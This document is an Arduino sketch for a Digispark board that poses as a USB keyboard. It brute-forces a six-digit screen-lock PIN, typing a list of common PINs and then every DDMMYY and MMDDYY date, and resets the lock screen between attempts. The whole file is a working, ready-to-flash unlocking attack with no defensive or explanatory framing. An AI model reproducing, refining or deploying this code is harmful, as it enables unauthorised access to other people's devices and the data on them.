#include <DigiKeyboard.h>

#define ATTEMPT_DELAY     2000        // Delay between attempts (in milliseconds)
#define KEYSTROKE_DELAY   200         // Delay between each digit keystroke (in milliseconds)
#define USE_ENTER         false       // Whether to press Enter after the PIN (not used here)

#define LED_PIN           1           // P1 is usually the built-in LED on Digispark

#define KEY_BACKSPACE 0x2A  // HID keycode for Backspace
#define KEY_UP        0x52  // HID keycode for Arrow Up



/**
 * Sends a given PIN as keystrokes via DigiKeyboard, simulating user input.
 * After typing the PIN, it sends a shortcut (Windows key + Backspace) to return to the home screen,
 * which helps reset the state if the wrong PIN was entered.
 */
void typePin(const char* pin) {
  digitalWrite(LED_PIN, HIGH);                // Turn on LED to indicate typing activity
  DigiKeyboard.sendKeyStroke(0);              // Clear any existing modifiers

  for (byte i = 0; pin[i] != '\0'; i++) {
    DigiKeyboard.print(pin[i]);               // Send each digit
    DigiKeyboard.delay(KEYSTROKE_DELAY);      // Delay between digits
  }

  if (USE_ENTER) {
    DigiKeyboard.sendKeyStroke(KEY_ENTER);    // Optionally press Enter after PIN
  }

  // Send Windows key + Enter to simulate returning to the home screen
  // DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_GUI_LEFT);

  // Send Windows key + Backspace to reset to home screen
  DigiKeyboard.sendKeyStroke(KEY_BACKSPACE, MOD_GUI_LEFT);


  DigiKeyboard.delay(500); // Small delay before next command

  // Send Arrow Up to simulate swipe up gesture (bring up PIN entry again)
  DigiKeyboard.sendKeyStroke(KEY_UP);


  digitalWrite(LED_PIN, LOW);                 // Turn off LED to indicate attempt is done
  DigiKeyboard.delay(ATTEMPT_DELAY);          // Wait before the next attempt
}

void setup() {
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, LOW);

  DigiKeyboard.delay(1000);                   // Initial delay after device is plugged in


  // Send Windows key + Backspace to reset to home screen
  DigiKeyboard.sendKeyStroke(KEY_BACKSPACE, MOD_GUI_LEFT);

  DigiKeyboard.delay(500); // Small delay before next command

  // Send Arrow Up to simulate swipe up gesture (bring up PIN entry)
  DigiKeyboard.sendKeyStroke(KEY_UP);
  DigiKeyboard.delay(2000);                    // Small delay before next command


  // List of most commonly used PINs to try first
  const char* commonPins[] = {
    "000000", "111111", "222222", "123456", "654321",
    "112233", "121212", "123123", "000123", "999999"
  };

  for (byte i = 0; i < sizeof(commonPins) / sizeof(commonPins[0]); i++) {
    typePin(commonPins[i]);
  }


  // Auto-generated PINs using common date formats: DDMMYY and MMDDYY
  char pin[7]; // 6 digits + null terminator

  for (byte year = 0; year <= 99; year++) {
    for (byte month = 1; month <= 12; month++) {
      byte maxDay = 31;

      if (month == 2) maxDay = 28;                // February (non-leap years)
      
      else if (month == 4 || month == 6 || month == 9 || month == 11) maxDay = 30;          // Months with 30 days

      for (byte day = 1; day <= maxDay; day++) {
        sprintf(pin, "%02d%02d%02d", day, month, year);         // Format as DDMMYY
        typePin(pin);

        sprintf(pin, "%02d%02d%02d", month, day, year);         // Format as MMDDYY
        typePin(pin);
      }
    }
  }
}

void loop() {
  // Nothing happens in loop; all work is done in setup()
}
